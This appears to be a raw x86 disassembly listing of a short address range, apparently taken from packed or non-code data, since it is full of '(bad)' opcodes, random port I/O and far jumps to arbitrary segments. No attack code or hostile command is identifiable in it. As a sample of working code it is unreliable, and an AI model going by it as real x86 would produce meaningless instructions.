  41d8df:	lods   al,BYTE PTR ds:[esi]
  41d8e0:	push   edi
  41d8e1:	inc    esi
  41d8e2:	inc    esi
  41d8e3:	xor    eax,DWORD PTR [ebx-0x30faeeb]
  41d8e9:	sub    dl,BYTE PTR [ecx-0x36dd8a]
  41d8ef:	adc    eax,0xca485b31
  41d8f4:	lock loope 0x41d8e7
  41d8f7:	jbe    0x41d956
  41d8f9:	xor    DWORD PTR [eax+eiz*4+0x50],eax
  41d8fd:	cmc    
  41d8fe:	mov    cl,0x11
  41d900:	leave  
  41d901:	addr16 or al,0x1a
  41d904:	sub    bh,BYTE PTR [ecx]
  41d906:	lock mov eax,0xda706b01
  41d90c:	xor    DWORD PTR fs:[eax-0x11],esp
  41d910:	stos   DWORD PTR es:[edi],eax
  41d911:	inc    ecx
  41d912:	cmp    bh,BYTE PTR [eax+0x67]
  41d915:	bound  ecx,QWORD PTR [ebx-0x2b]
  41d918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d919:	in     eax,0xac
  41d91b:	scas   al,BYTE PTR es:[edi]
  41d91c:	loop   0x41d905
  41d91e:	je     0x41d982
  41d920:	cmc    
  41d921:	daa    
  41d922:	adc    eax,0x34e9abc2
  41d927:	in     al,dx
  41d928:	add    BYTE PTR [eax-0x562177e7],ch
  41d92e:	mov    ds:0x80667cbf,al
  41d933:	addr16 int 0x92
  41d936:	adc    ah,al
  41d938:	mov    eax,ds:0x9cd6cc1f
  41d93d:	fwait
  41d93e:	rcr    DWORD PTR [ebx],1
  41d940:	ds push cs
  41d942:	xchg   BYTE PTR [ebx-0x33],cl
  41d945:	test   eax,0xb03d9692
  41d94a:	mov    dh,0x96
  41d94c:	cwde   
  41d94d:	mov    ds:0x7b081407,al
  41d952:	outs   dx,DWORD PTR ds:[esi]
  41d953:	and    ebx,DWORD PTR [esi+0x54]
  41d956:	push   0x58
  41d958:	idiv   DWORD PTR [eax-0x22efec31]
  41d95e:	leave  
  41d95f:	mov    bl,0x7a
  41d961:	stc    
  41d962:	leave  
  41d963:	stos   DWORD PTR es:[edi],eax
  41d964:	sbb    dl,0x4f
  41d967:	and    ecx,DWORD PTR [edi+0x4c]
  41d96a:	dec    esp
  41d96b:	not    BYTE PTR [edi+0x46f84be6]
  41d971:	jmp    0x41d9e3
  41d973:	xor    BYTE PTR [ecx],0x30
  41d976:	jbe    0x41d919
  41d978:	test   DWORD PTR [edx],ecx
  41d97a:	subps  xmm6,XMMWORD PTR [ecx]
  41d97d:	mov    DWORD PTR [edi+0x1c],edi
  41d980:	add    eax,0x31f5423a
  41d985:	add    DWORD PTR [eax-0x20e39db1],ebx
  41d98b:	(bad)  
  41d98c:	push   ebp
  41d98d:	xchg   ebx,eax
  41d98e:	mov    BYTE PTR [edi-0x1],cl
  41d991:	or     eax,0x9c7b348b
  41d996:	imul   edi,DWORD PTR [esi],0x17
  41d999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d99a:	clc    
  41d99b:	scas   al,BYTE PTR es:[edi]
  41d99c:	aad    0xc2
  41d99e:	jns    0x41d9bc
  41d9a0:	mov    ch,0x46
  41d9a2:	and    edi,edi
  41d9a4:	sbb    al,0x75
  41d9a6:	cdq    
  41d9a7:	or     BYTE PTR [esi+0x64],ah
  41d9aa:	pop    esp
  41d9ab:	fistp  DWORD PTR cs:[ecx]
  41d9ae:	jb     0x41d935
  41d9b0:	mov    ecx,0xcabbee1b
  41d9b5:	xchg   ecx,eax
  41d9b6:	stos   BYTE PTR es:[edi],al
  41d9b7:	daa    
  41d9b8:	adc    DWORD PTR ds:0x91e0d978,0xffffffc1
  41d9bf:	sub    edx,DWORD PTR [esi+0x1fb4bfd5]
  41d9c5:	cld    
  41d9c6:	pushf  
  41d9c7:	mov    ecx,0x3aafc7e6
  41d9cc:	shrd   DWORD PTR [ebx],ebx,0x5b
  41d9d0:	mov    ebx,0x8247705e
  41d9d5:	pop    es
  41d9d6:	das    
  41d9d7:	push   ebp
  41d9d8:	pop    es
  41d9d9:	push   ds
  41d9da:	pop    edi
  41d9db:	dec    esp
  41d9dc:	not    cl
  41d9de:	(bad)  
  41d9df:	pop    ds
  41d9e0:	push   ss
  41d9e1:	inc    esp
  41d9e2:	fdivr  DWORD PTR [ebx+0x4f]
  41d9e5:	mov    ebp,edx
  41d9e7:	inc    edi
  41d9e8:	cli    
  41d9e9:	mov    dh,0xa
  41d9eb:	pushf  
  41d9ec:	(bad)  
  41d9ed:	mov    bl,0x64
  41d9ef:	adc    ebx,DWORD PTR [esi-0x76]
  41d9f2:	in     al,0xef
  41d9f4:	inc    edx
  41d9f5:	xchg   edx,eax
  41d9f6:	mov    dl,al
  41d9f8:	addr16 cmp bl,bh
  41d9fb:	xchg   ch,ah
  41d9fd:	pop    esp
  41d9fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9ff:	push   ebx
  41da00:	jle    0x41da46
  41da02:	test   al,0xc6
  41da04:	repz in eax,0xd3
  41da07:	scas   al,BYTE PTR es:[edi]
  41da08:	sbb    eax,0x42905707
  41da0d:	pop    ebp
  41da0e:	stc    
  41da0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da10:	outs   dx,BYTE PTR ds:[esi]
  41da11:	push   esi
  41da12:	inc    esp
  41da13:	lds    edi,FWORD PTR [eax+0x4c59e876]
  41da19:	xchg   esp,eax
  41da1a:	pop    esp
  41da1b:	fwait
  41da1c:	dec    ebx
  41da1d:	jb     0x41d9b0
  41da1f:	mov    edx,es
  41da21:	test   BYTE PTR [esi+ecx*8+0x32402839],al
  41da28:	xor    DWORD PTR [eax-0x67a4a159],0x784e15f8
  41da32:	jle    0x41d9ea
  41da34:	mov    edi,cs
  41da36:	outs   dx,BYTE PTR ds:[esi]
  41da37:	jle    0x41da36
  41da39:	in     al,0x3c
  41da3b:	test   eax,0xe1f11c7d
  41da40:	add    dh,BYTE PTR [ecx+0x2b507f9]
  41da46:	sub    al,0x11
  41da48:	ret    
  41da49:	outs   dx,BYTE PTR ds:[esi]
  41da4a:	enter  0xa258,0xa5
  41da4e:	fstp   DWORD PTR [ecx+0x65]
  41da51:	bound  esp,QWORD PTR ss:[eax]
  41da54:	adc    eax,0x9542a87f
  41da59:	pop    eax
  41da5a:	fnstenv [ecx-0x75b4443f]
  41da60:	scas   al,BYTE PTR es:[edi]
  41da61:	loope  0x41da86
  41da63:	jns    0x41da1a
  41da65:	sub    BYTE PTR [esi],al
  41da67:	dec    edx
  41da68:	stc    
  41da69:	add    al,0x80
  41da6b:	out    0x52,al
  41da6d:	pop    edx
  41da6e:	xchg   edi,eax
  41da6f:	out    dx,al
  41da70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da71:	and    dh,dl
  41da73:	loope  0x41da3d
  41da75:	jns    0x41da47
  41da77:	loope  0x41da09
  41da79:	inc    ebx
  41da7a:	popf   
  41da7b:	jp     0x41dad3
  41da7d:	sub    esp,esi
  41da7f:	enter  0xf160,0x83
  41da83:	(bad)  
  41da84:	fisttp WORD PTR [ecx+0x4739813a]
  41da8a:	jb     0x41da7f
  41da8c:	test   DWORD PTR [eax+0x4d],0x9a2e82c5
  41da93:	mov    dl,0xb
  41da95:	inc    ebp
  41da96:	push   0x79
  41da98:	xrelease mov BYTE PTR [ecx-0x9ef6670],bh
  41da9f:	stos   DWORD PTR es:[edi],eax
  41daa0:	inc    esp
  41daa1:	cmp    edi,esi
  41daa3:	pop    ecx
  41daa4:	inc    ebx
  41daa5:	enter  0xfcc,0x42
  41daa9:	push   ds
  41daaa:	cld    
  41daab:	lock popf 
  41daad:	dec    esi
  41daae:	push   ds
  41daaf:	xchg   edi,eax
  41dab0:	adc    DWORD PTR [ecx],edx
  41dab2:	add    eax,0xdd9bcb15
  41dab7:	cmp    ch,bh
  41dab9:	cdq    
  41daba:	dec    edx
  41dabb:	add    eax,0x4119a368
  41dac0:	cld    
  41dac1:	dec    ebp
  41dac2:	inc    ecx
  41dac3:	mov    dh,0x74
  41dac5:	mov    ch,0x2c
  41dac7:	and    bl,BYTE PTR [edx-0x67983d38]
  41dacd:	xchg   esi,eax
  41dace:	lods   eax,DWORD PTR ds:[esi]
  41dacf:	cmp    dh,cl
  41dad1:	fsub   QWORD PTR ss:[edi]
  41dad4:	and    DWORD PTR ds:0x4017593e,eax
  41dada:	fistp  DWORD PTR [esi+0xef581d5]
  41dae0:	ret    
  41dae1:	jae    0x41daeb
  41dae3:	xor    eax,edi
  41dae5:	fst    DWORD PTR [edx]
  41dae7:	pop    ecx
  41dae8:	addr16 dec ebp
  41daea:	fdivr  QWORD PTR [ebp+ebp*8-0x2e]
  41daee:	imul   ecx,DWORD PTR [esi+0x79],0x10
  41daf2:	inc    ebp
  41daf3:	pop    ebp
  41daf4:	or     DWORD PTR [ecx+ebx*2+0xd82832d],edi
  41dafb:	cmp    eax,0xa89f44e0
  41db00:	into   
  41db01:	and    bl,BYTE PTR [eax-0x22f48654]
  41db07:	push   ds
  41db08:	in     eax,dx
  41db09:	stc    
  41db0a:	push   0x65
  41db0c:	aas    
  41db0d:	or     eax,0xf55b7897
  41db12:	test   DWORD PTR [ecx+0x1fdc84],0xaf6e7f14
  41db1c:	daa    
  41db1d:	pusha  
  41db1e:	stc    
  41db1f:	fcmovu st,st(1)
  41db21:	pop    ecx
  41db22:	push   edx
  41db23:	mov    edx,0x7bfc1658
  41db28:	retf   0x3ed3
  41db2b:	jae    0x41dac0
  41db2d:	sub    al,0xf1
  41db2f:	and    BYTE PTR [ebp+0x4f],0x52
  41db33:	mov    bl,0x24
  41db35:	mov    esp,0x9a2d2a3
  41db3a:	pop    eax
  41db3b:	and    ebp,DWORD PTR [eax-0x54e927bf]
  41db41:	sbb    eax,0xf11c2cba
  41db46:	adc    dl,dh
  41db48:	mov    ah,dl
  41db4a:	jmp    0x649ab3b0
  41db4f:	fnsave [esi+0x5b1c2904]
  41db55:	xchg   ecx,eax
  41db56:	sub    DWORD PTR [esi+0xee2b617],esp
  41db5c:	xor    ch,BYTE PTR [ecx+0x8]
  41db5f:	jl     0x41db81
  41db61:	lahf   
  41db62:	dec    ecx
  41db63:	retf   
  41db64:	std    
  41db65:	mov    bh,0x6e
  41db67:	jmp    0xa6fd66cb
  41db6c:	xchg   ecx,eax
  41db6d:	(bad)  
  41db6e:	sub    BYTE PTR [edx],ch
  41db70:	xchg   esi,eax
  41db71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db72:	std    
  41db73:	jnp    0x41db6b
  41db75:	pop    ecx
  41db76:	adc    al,0xa
  41db78:	retf   0xad3d
  41db7b:	mov    esi,DWORD PTR [eax+ebp*8+0x3ec86b5]
  41db82:	das    
  41db83:	sbb    eax,0xa1a28983
  41db88:	jmp    DWORD PTR [ecx+esi*8]
  41db8b:	inc    eax
  41db8c:	in     al,dx
  41db8d:	scas   eax,DWORD PTR es:[edi]
  41db8e:	fcmovb st,st(2)
  41db90:	ficom  WORD PTR [ebx+0x423f56fe]
  41db96:	mov    ch,0xd1
  41db98:	out    dx,al
  41db99:	(bad)
  41db9d:	repnz mov ds:0xb56b4d82,al
  41dba3:	xchg   esi,eax
  41dba4:	out    0x31,eax
  41dba6:	(bad)
  41dbaa:	mov    edx,0x88719359
  41dbaf:	adc    DWORD PTR [ebp-0x58],edi
  41dbb2:	dec    esi
  41dbb3:	out    0x7a,al
  41dbb5:	xor    DWORD PTR [edi+0x2e],0xffffffee
  41dbb9:	push   ecx
  41dbba:	xchg   ebx,eax
  41dbbb:	mov    cl,BYTE PTR [esi+0x13]
  41dbbe:	inc    edi
  41dbbf:	repz dec ecx
  41dbc1:	mov    dh,0x33
  41dbc4:	neg    DWORD PTR [edx+0x44]
  41dbc7:	pop    eax
  41dbc8:	icebp  
  41dbc9:	neg    BYTE PTR [esi-0x27e87b33]
  41dbcf:	repnz and bl,0x3e
  41dbd3:	or     al,0x9
  41dbd5:	popf   
  41dbd6:	les    edx,FWORD PTR [eax+0x17]
  41dbd9:	push   ds
  41dbda:	outs   dx,DWORD PTR ds:[esi]
  41dbdb:	sbb    eax,0x7d7175cd
  41dbe0:	(bad)  [edi-0x44]
  41dbe3:	aas    
  41dbe4:	push   esi
  41dbe5:	cmp    al,0xc8
  41dbe7:	and    dl,BYTE PTR [edi]
  41dbe9:	sbb    bl,BYTE PTR [ecx-0x6]
  41dbec:	sbb    bh,al
  41dbee:	xor    edi,ebp
  41dbf0:	pop    ss
  41dbf1:	adc    al,0x13
  41dbf3:	mov    ds:0xb4e4a90e,al
  41dbf8:	iret   
  41dbf9:	inc    ebx
  41dbfa:	pop    eax
  41dbfb:	retf   0x5a1a
  41dbfe:	ret    0x2db6
  41dc01:	or     ah,BYTE PTR [edx]
  41dc03:	lahf   
  41dc04:	jge    0x41dc37
  41dc06:	sti    
  41dc07:	pushf  
  41dc08:	inc    esi
  41dc09:	xor    dh,BYTE PTR [ebx]
  41dc0b:	imul   DWORD PTR [eax+0x42309b7a]
  41dc11:	cmp    BYTE PTR [edi+0x68968c92],dl
  41dc17:	push   ecx
  41dc18:	mov    WORD PTR [ebx],ds
  41dc1a:	aaa    
  41dc1b:	push   edx
  41dc1c:	test   DWORD PTR [eax+ecx*1+0x5c],ebx
  41dc20:	les    ebx,FWORD PTR [esi+0x7c]
  41dc23:	sub    esp,DWORD PTR ds:0x538398d5
  41dc29:	add    al,BYTE PTR [eax-0x65]
  41dc2c:	fcmovne st,st(6)
  41dc2e:	call   0x6335:0x6c03789
  41dc35:	(bad)  
  41dc36:	push   cs
  41dc37:	cmp    eax,DWORD PTR [ebx]
  41dc39:	sbb    eax,esp
  41dc3b:	les    esi,FWORD PTR [esi]
  41dc3d:	inc    ebx
  41dc3e:	mov    edi,gs
  41dc40:	xchg   ebp,eax
  41dc41:	(bad)  
  41dc42:	cmp    ecx,DWORD PTR [esi+0x5a]
  41dc45:	lea    esp,ds:0xf1028b85
  41dc4b:	les    esi,FWORD PTR [edx-0x5d0ffa77]
  41dc51:	push   0xffffff98
  41dc53:	fs jbe 0x41dc73
  41dc56:	stc    
  41dc57:	aaa    
  41dc58:	dec    ecx
  41dc59:	in     al,dx
  41dc5a:	jne    0x41dc39
  41dc5c:	pop    ebp
  41dc5d:	pop    ss
  41dc5e:	xor    ch,BYTE PTR [ebx+ebp*8-0x53]
  41dc62:	jl     0x41dbec
  41dc64:	push   ecx
  41dc65:	push   edx
  41dc66:	or     BYTE PTR [ecx],bl
  41dc68:	push   edi
  41dc69:	xchg   DWORD PTR [edi+0x79],edx
  41dc6c:	lds    ebx,FWORD PTR [ecx]
  41dc6e:	repnz mov al,ds:0xe5ec7198
  41dc74:	in     eax,dx
  41dc75:	cmp    DWORD PTR [eax],esi
  41dc77:	sub    BYTE PTR [edx],cl
  41dc79:	pop    edi
  41dc7a:	loope  0x41dc44
  41dc7c:	push   ebx
  41dc7d:	(bad)
  41dc81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc82:	pop    ebp
  41dc83:	int    0xd3
  41dc85:	push   es
  41dc86:	inc    edi
  41dc87:	shl    DWORD PTR ds:0x3059f818,cl
  41dc8d:	fadd   QWORD PTR [eax-0x7a6dafc2]
  41dc93:	dec    edx
  41dc94:	bound  esi,QWORD PTR [edi+0x69e88ec7]
  41dc9a:	and    edx,0x4c
  41dc9d:	push   cs
  41dc9e:	mov    bh,0xc8
  41dca0:	mov    esi,0xef180de7
  41dca5:	sar    BYTE PTR [ecx],cl
  41dca7:	aas    
  41dca8:	aam    0xb3
  41dcaa:	data16 sbb bh,BYTE PTR [edx+0x4f]
  41dcae:	out    0x8a,eax
  41dcb0:	es leave 
  41dcb2:	aaa    
  41dcb3:	sbb    DWORD PTR [edi],eax
  41dcb5:	pop    edx
  41dcb6:	mov    ebx,0xb87eb2f5
  41dcbb:	or     esi,ebx
  41dcbd:	pop    ss
  41dcbe:	into   
  41dcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc0:	jmp    0xe1ca:0x9f425306
  41dcc7:	and    DWORD PTR [ebx+0x36],edx
  41dcca:	push   ecx
  41dccb:	ret    
  41dccc:	cld    
  41dccd:	iret   
  41dcce:	mul    BYTE PTR [ecx]
  41dcd0:	stc    
  41dcd1:	repnz adc bh,BYTE PTR [esi]
  41dcd4:	ror    BYTE PTR [ebp-0x2764f760],cl
  41dcda:	pop    edx
  41dcdb:	inc    edi
  41dcdc:	ror    esp,1
  41dcde:	retf   0xb129
  41dce1:	inc    esp
  41dce2:	and    BYTE PTR [edi+0x27],al
  41dce5:	pop    ss
  41dce6:	les    esp,FWORD PTR [ebx]
  41dce8:	mov    BYTE PTR es:[eax],ch
  41dceb:	inc    ebx
  41dcec:	ins    DWORD PTR es:[edi],dx
  41dced:	xor    eax,0x645d8afa
  41dcf2:	jmp    0x41dd45
  41dcf4:	les    esi,FWORD PTR [edi+0x23]
  41dcf7:	or     esi,DWORD PTR [ebx+ecx*2+0x5ce06e16]
  41dcfe:	mov    ah,0x30
  41dd00:	and    eax,0x5096a2f3
  41dd05:	bndstx [ecx],(bad)
  41dd08:	imul   edx,edx,0x629c75b6
  41dd0e:	or     eax,0xc31838d3
  41dd13:	and    DWORD PTR [ecx],eax
  41dd15:	pop    edx
  41dd16:	(bad)  
  41dd17:	cmp    DWORD PTR [ebx+0x9292c5a],edi
  41dd1d:	or     edx,esi
  41dd1f:	mov    edx,edx
  41dd21:	addr16 add ch,bh
  41dd24:	push   ebx
  41dd25:	in     al,0x8e
  41dd27:	scas   eax,DWORD PTR es:[edi]
  41dd28:	xor    eax,0xd02c5b7d
  41dd2d:	jl     0x41dd6e
  41dd2f:	jl     0x41dcc1
  41dd31:	ds pop esi
  41dd33:	into   
  41dd34:	out    0x8f,eax
  41dd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd37:	pop    ecx
  41dd38:	adc    cl,BYTE PTR [eax-0x6cb0e7c9]
  41dd3e:	(bad)  
  41dd3f:	cmc    
  41dd40:	and    DWORD PTR ds:0x5064519d,ebx
  41dd46:	jnp    0x41dce2
  41dd48:	jnp    0x41dcf0
  41dd4a:	add    eax,0x5f9133ec
  41dd4f:	pusha  
  41dd50:	jns    0x41dd15
  41dd52:	cmp    esi,DWORD PTR [eax+ebx*2]
  41dd55:	push   edx
  41dd56:	lds    ebx,FWORD PTR [ebp*8-0x71801677]
  41dd5d:	loope  0x41ddd6
  41dd5f:	or     cl,BYTE PTR [eax+0x15]
  41dd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd64:	pop    ss
  41dd65:	out    dx,al
  41dd66:	loop   0x41dce9
  41dd68:	or     bl,bl
  41dd6a:	sbb    DWORD PTR [edi+0x37],ebx
  41dd6d:	call   0xeb5ffc36
  41dd72:	data16 jp 0x41dd57
  41dd75:	sbb    DWORD PTR [esi],edi
  41dd77:	pop    edx
  41dd78:	jg     0x41ddcb
  41dd7a:	cmp    eax,0x2fdb8cef
  41dd7f:	mov    esi,0xc5d88a0e
  41dd84:	pop    ebx
  41dd85:	repnz pop edi
  41dd87:	and    eax,0x88a8d4d8
  41dd8c:	sub    cl,BYTE PTR [esi+eax*4-0x36]
  41dd90:	rol    DWORD PTR [edx+0x4af07751],1
  41dd96:	mov    al,0x6a
  41dd98:	push   ebp
  41dd99:	fs sbb al,0xa4
  41dd9c:	(bad)  
  41dd9d:	mov    esp,0x21a679ef
  41dda2:	jbe    0x41dd46
  41dda4:	inc    eax
  41dda5:	cmp    eax,0xfe0350af
  41ddaa:	jb     0x41ddd4
  41ddac:	mov    ecx,0xd59aee58
  41ddb1:	(bad)  
  41ddb2:	cmp    DWORD PTR ds:[edx-0x6cb660fd],ecx
  41ddb9:	(bad)  
  41ddbb:	sub    edx,edx
  41ddbd:	outs   dx,BYTE PTR ds:[esi]
  41ddbe:	shr    BYTE PTR [ebx],cl
  41ddc0:	lea    esi,[ebx+eax*2]
  41ddc3:	mov    bh,0xa6
  41ddc5:	fs sbb edx,esp
  41ddc8:	sub    BYTE PTR [ebp+0x5ed3c443],bl
  41ddce:	in     eax,dx
  41ddcf:	aaa    
  41ddd0:	lahf   
  41ddd1:	xchg   DWORD PTR [esi],eax
  41ddd3:	stos   DWORD PTR es:[edi],eax
  41ddd4:	fwait
  41ddd5:	xchg   ecx,eax
  41ddd7:	mov    eax,ds:0xc97119d5
  41dddc:	pushf  
  41dddd:	aad    0x37
  41dddf:	(bad)  
  41dde0:	jle    0x41ddcc
  41dde2:	js     0x41de1b
  41dde4:	adc    dh,BYTE PTR [edx]
  41dde6:	mov    ch,0x6
  41dde8:	or     DWORD PTR [edx-0x53217aa6],0x380c97bf
  41ddf2:	push   0x3ff200f1
  41ddf7:	(bad)  
  41ddf8:	adc    eax,0xb4881491
  41ddfd:	pop    edi
  41ddfe:	fimul  WORD PTR [edi]
  41de00:	pusha  
  41de01:	dec    ebx
  41de02:	xchg   esi,eax
  41de03:	push   edi
  41de04:	mov    ecx,0x120328d
  41de09:	sub    ebx,DWORD PTR [edx+edx*4]
  41de0c:	(bad)  
  41de0d:	xchg   esp,eax
  41de0e:	jp     0x41de7d
  41de10:	das    
  41de11:	mov    ds:0xe7c97911,al
  41de16:	lods   al,BYTE PTR ds:[esi]
  41de17:	cmp    eax,0xb7da1812
  41de1c:	push   cs
  41de1d:	hlt    
  41de1e:	jmp    0x41de7f
  41de20:	out    0x5b,eax
  41de22:	inc    eax
  41de23:	mov    WORD PTR [ebp-0x3ec31399],?
  41de29:	(bad)  
  41de2a:	fsubr  DWORD PTR [esi-0x4d83fac3]
  41de30:	shl    dh,cl
  41de32:	jge    0x41dde5
  41de34:	outs   dx,BYTE PTR ds:[esi]
  41de35:	and    al,bh
  41de37:	scas   eax,DWORD PTR es:[edi]
  41de38:	or     dl,BYTE PTR [esi]
  41de3a:	and    DWORD PTR [eax+0x18c5f8c3],0xfee6f6f5
  41de44:	mov    ds:0x4cd533de,al
  41de49:	jo     0x41de17
  41de4b:	test   eax,0x52b621e8
  41de50:	mov    ah,dl
  41de52:	std    
  41de53:	in     al,dx
  41de54:	adc    cl,cl
  41de56:	pop    edi
  41de57:	push   eax
  41de58:	mov    bl,0x5a
  41de5a:	pop    esi
  41de5b:	retf   
  41de5c:	stos   DWORD PTR es:[edi],eax
  41de5d:	mov    ebx,0x2f7681d7
  41de62:	sub    eax,ebx
  41de64:	mov    ds:0xa8cf96ad,eax
  41de69:	or     eax,0xa0038bed
  41de6e:	nop
  41de6f:	sbb    al,0x37
  41de71:	inc    ebp
  41de72:	data16 addr16 sbb bh,ch
  41de76:	mov    bl,BYTE PTR [ecx-0x6b0303f7]
  41de7c:	scas   al,BYTE PTR es:[edi]
  41de7d:	sub    cl,BYTE PTR ds:0xfd95ee9
  41de83:	xchg   edx,eax
  41de84:	jae    0x41de99
  41de86:	cmc    
  41de87:	push   edx
  41de88:	sbb    bh,BYTE PTR [esi-0x6a]
  41de8b:	pushf  
  41de8c:	sub    edi,edi
  41de8e:	stos   BYTE PTR es:[edi],al
  41de8f:	xor    eax,0xfbfd664
  41de94:	fsub   QWORD PTR [eax-0x68b76190]
  41de9a:	jle    0x41de9d
  41de9c:	(bad)  
  41de9e:	iret   
  41de9f:	jo     0x41de9b
  41dea1:	or     ebx,esi
  41dea3:	mov    esi,0x1458937d
  41dea8:	data16 add BYTE PTR [eax+esi*1],bl
  41deac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dead:	xchg   ecx,eax
  41deae:	shr    BYTE PTR [edi+0x60],0x4d
  41deb2:	push   es
  41deb3:	mov    esi,0x74aa5cd2
  41deb8:	xor    DWORD PTR [eax+0x5a],esi
  41debb:	and    eax,0x413cd15a
  41dec0:	mov    ds:0xc64b492d,eax
  41dec5:	out    0xd6,eax
  41dec7:	jg     0x41df48
  41dec9:	jmp    0x6481:0xafe13d2a
  41ded0:	data16 loopne 0x41de69
  41ded3:	(bad)  
  41ded5:	and    DWORD PTR ds:0x9a1ab50,edi
  41dedb:	jle    0x41de5d
  41dedd:	pop    ss
  41dede:	inc    edi
  41dedf:	xchg   DWORD PTR [ebx],ecx
  41dee1:	push   ss
  41dee2:	cs nop
  41dee4:	pop    edi
  41dee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee6:	jbe    0x3c30e40f
  41deec:	ret    
  41deed:	loope  0x41df64
  41deef:	shl    BYTE PTR [eax-0x59464dd1],0xf6
  41def6:	push   0xfd1d166d
  41defb:	lea    eax,[ebp+0x6382a890]
  41df01:	mov    bh,0x16
  41df03:	cmp    BYTE PTR [ebx],bl
  41df05:	loope  0x41df69
  41df07:	jno    0x41df4b
  41df09:	mov    ds:0x59453535,al
  41df0e:	rcl    BYTE PTR [ebp-0x64b6d6b5],1
  41df14:	pop    ebp
  41df15:	ja     0x41defa
  41df17:	push   ebx
  41df18:	inc    ebx
  41df19:	push   ecx
  41df1a:	or     al,0x4f
  41df1c:	(bad)  
  41df1d:	in     eax,0x10
  41df1f:	and    eax,0xdb62a3
  41df24:	xchg   edx,eax
  41df25:	jg     0x41df72
  41df27:	out    dx,eax
  41df28:	jno    0x41df6a
  41df2a:	fs and al,0xa
  41df2d:	(bad)  
  41df2e:	(bad)  
  41df2f:	and    DWORD PTR [esi+0x4719937b],eax
  41df35:	test   eax,0xa819860f
  41df3a:	aam    0xce
  41df3c:	xchg   BYTE PTR [ecx-0x65d49d4f],ch
  41df42:	inc    eax
  41df43:	rcr    DWORD PTR [ebx+0x548c34dc],1
  41df49:	(bad)  
  41df4a:	ss (bad) 
  41df4c:	lahf   
  41df4d:	add    DWORD PTR [esi+ebx*4-0x360bb8d9],0xba875d38
  41df58:	inc    esp
  41df59:	xchg   esp,eax
  41df5a:	into   
  41df5b:	pop    ebp
  41df5c:	push   esp
  41df5d:	jp     0x41df41
  41df5f:	(bad)  [ebp+0x9d64f8b]
  41df65:	lock inc esp
  41df67:	call   DWORD PTR [edi]
  41df69:	std    
  41df6a:	xor    ebx,ebx
  41df6c:	and    DWORD PTR [ebx],edx
  41df6e:	dec    DWORD PTR [esi]
  41df70:	pop    edx
  41df71:	loop   0x41df75
  41df73:	jns    0x41df66
  41df75:	push   ebp
  41df76:	or     BYTE PTR [eax+0x3f],ah
  41df79:	das    
  41df7a:	fidivr DWORD PTR [eax-0x924db09]
  41df80:	das    
  41df81:	out    0xd5,eax
  41df83:	jl     0x41dfde
  41df85:	mov    dl,0x4e
  41df87:	lods   al,BYTE PTR ds:[esi]
  41df88:	icebp  
  41df89:	stos   DWORD PTR es:[edi],eax
  41df8a:	popa   
  41df8b:	in     al,0x6f
  41df8d:	sbb    eax,0x2973a080
  41df92:	bswap  esi
  41df94:	out    dx,al
  41df95:	jns    0x41df3b
  41df97:	pop    esi
  41df98:	das    
  41df99:	std    
  41df9a:	ret    
  41df9b:	ins    BYTE PTR es:[edi],dx
  41df9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9d:	shl    BYTE PTR ds:0x5ec31dcc,1
  41dfa3:	sbb    eax,0x16b868fa
  41dfa8:	xchg   ebp,eax
  41dfa9:	adc    DWORD PTR ds:0xbb1b4c66,edi
  41dfaf:	cmp    DWORD PTR [eax+0x6b],eax
  41dfb2:	mov    edi,0xcfc58ef5
  41dfb7:	or     DWORD PTR [ebx+0x74],eax
  41dfba:	fwait
  41dfbb:	sti    
  41dfbc:	mov    edx,0xf231fa6d
  41dfc1:	in     al,0xcf
  41dfc3:	dec    edi
  41dfc4:	lea    edi,[edx+ecx*2-0x11]
  41dfc8:	(bad)
  41dfcb:	cmp    dl,bl
  41dfcd:	mov    ds:0xf75dcaa0,al
  41dfd2:	bound  ebx,QWORD PTR [ebx+0x7f]
  41dfd5:	outs   dx,DWORD PTR ds:[esi]
  41dfd6:	push   esi
  41dfd7:	cmc    
  41dfd8:	cmp    al,0x75
  41dfda:	mov    ebx,eax
  41dfdc:	pop    ebx
  41dfdd:	pop    ds
  41dfde:	aam    0xd4
  41dfe0:	idiv   BYTE PTR [ebp+eiz*8+0x7]
  41dfe4:	add    ch,BYTE PTR ds:0xe777bde4
  41dfea:	xor    BYTE PTR [edi+0x6eb09fca],cl
  41dff0:	int    0x38
  41dff2:	pop    edi
  41dff3:	stos   BYTE PTR es:[edi],al
  41dff4:	mov    al,0xcf
  41dff6:	sbb    eax,0xa25deae
  41dffb:	shr    BYTE PTR [esp+esi*1],1
  41dffe:	cmp    BYTE PTR [edi-0x5fc86015],al
  41e004:	jne    0x41dfff
  41e006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e007:	sbb    ebp,esp
  41e009:	pop    es
  41e00a:	popa   
  41e00b:	je     0x41df8f
  41e00d:	dec    esp
  41e00e:	xor    al,0x2
  41e010:	mov    bl,0xf0
  41e012:	sti    
  41e013:	loop   0x41dfed
  41e015:	ss popf 
  41e017:	cmp    DWORD PTR [ebx],edi
  41e019:	jge    0x41e07f
  41e01b:	jmp    0xb753a6ab
  41e020:	(bad)  
  41e021:	mov    eax,0x8b5246ff
  41e026:	fstp   TBYTE PTR [esi+edx*8]
  41e029:	mov    cl,0xbc
  41e02b:	pop    esp
  41e02c:	out    0xb2,al
  41e02e:	jmp    0x4f112663
  41e033:	pop    ds
  41e034:	and    eax,0x569f4508
  41e039:	daa    
  41e03a:	fnstcw WORD PTR ds:0x5ff1f4b8
  41e040:	fisttp WORD PTR [eax]
  41e042:	leave  
  41e043:	ja     0x41dfd1
  41e045:	adc    dh,bh
  41e047:	adc    eax,0x61d540ab
  41e04c:	pusha  
  41e04d:	pop    ds
  41e04e:	nop
  41e04f:	int3   
  41e050:	inc    esi
  41e051:	dec    esi
